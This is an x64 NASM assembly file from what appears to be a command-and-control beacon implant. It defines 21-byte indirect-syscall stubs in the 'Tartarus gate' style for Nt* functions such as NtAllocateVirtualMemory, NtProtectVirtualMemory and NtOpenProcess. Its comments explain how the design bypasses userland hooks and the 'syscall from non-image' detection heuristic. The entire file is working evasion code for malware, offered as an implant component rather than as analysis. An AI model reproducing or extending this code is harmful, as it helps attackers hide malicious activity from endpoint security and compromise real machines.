; beacon/asm/Syscall.x64.asm
; P1 — indirect-syscall stubs (Tartarus gate).
;
; One stub per Nt* the beacon calls directly.  Each stub is 21 bytes:
;   +0  4C 8B D1          mov r10, rcx        ; arg0 -> r10 (syscall ABI)
;   +3  B8 <ssn32>        mov eax, <SSN>      ; SSN patched at boot (+4)
;   +8  49 BB <gad64>     mov r11, <gadget>   ; ntdll `syscall;ret` addr (+10)
;   +18 41 FF E3          jmp r11             ; jump into ntdll -> syscall;ret
;
; The `syscall` instruction therefore executes INSIDE ntdll's .text (indirect),
; bypassing userland stub hooks and the "syscall from non-image" heuristic.
;
; SSN (+4..+7) and gadget (+10..+17) are 0/placeholders here; NaxSyscallsInit
; (Core/Syscall.c) patches them at boot via Nax->Kernel32.VirtualProtect before
; wiring Nax->Ntdll.NtX to the stub.  r10/r11 are scratch in the syscall ABI
; (args use r10,rdx,r8,r9 + stack; rdx/r8/r9/stack are already correct from the
; Win64 caller).  jmp (not call) preserves the caller's return address so the
; gadget's `ret` returns straight to the original caller with STATUS in rax.
;
; Byte layout MUST match include/Syscall.h (NAX_SC_OFF_SSN/GADGET).  NaxSyscallsInit
; asserts the template bytes before patching.

[BITS 64]
DEFAULT REL

; %macro: emit one stub.  %1 = C-visible symbol name (matches Syscall.h extern).
;
; Stubs are emitted as RAW BYTES (db/dd/dq), not assembler mnemonics, so the
; byte layout matches include/Syscall.h (NAX_SC_OFF_SSN/GADGET) BY CONSTRUCTION
; and is immune to NASM's size optimization.  Using mnemonics breaks the layout:
;   `mov r10, rcx`      -> NASM emits 49 89 CA (the 89 /r form), not 4C 8B D1
;   `mov r11, 0`        -> NASM emits 41 BB 00 00 00 00 (mov r11d, 0 — 6 bytes,
;                          zero-extending), NOT 49 BB + 8-byte imm (10 bytes).
; The second one is fatal: NAX_SC_OFF_GADGET=10 assumes an 8-byte immediate, but
; mov r11d only reserves 4 bytes at +10, so the 8-byte gadget patch would overrun
; `jmp r11`.  Raw bytes pin the exact 21-byte layout the C patcher expects.
%macro NAXSC 1
    global NaxSc_%1
    align 16
NaxSc_%1:
    db 0x4C, 0x8B, 0xD1                   ; +0   mov r10, rcx          (arg0 -> syscall ABI)
    db 0xB8                               ; +3   mov eax, imm32        (opcode)
    dd 0xFFFFFFFF                        ; +4   <SSN placeholder>     (patched at boot)
    db 0x49, 0xBB                         ; +8   mov r11, imm64        (REX.WB + opcode)
    dq 0x0000000000000000                 ; +10  <gadget placeholder>  (patched at boot)
    db 0x41, 0xFF, 0xE3                   ; +18  jmp r11
%endmacro

[SECTION .text$B]

    NAXSC NtAllocateVirtualMemory
    NAXSC NtProtectVirtualMemory
    NAXSC NtFreeVirtualMemory
    NAXSC NtOpenProcessToken
    NAXSC NtQueryInformationToken
    NAXSC NtQueryInformationProcess
    NAXSC NtSetInformationProcess
    NAXSC NtClose
    NAXSC NtQuerySystemInformation
    NAXSC NtQueryVirtualMemory
    NAXSC NtOpenProcess
    NAXSC NtTerminateProcess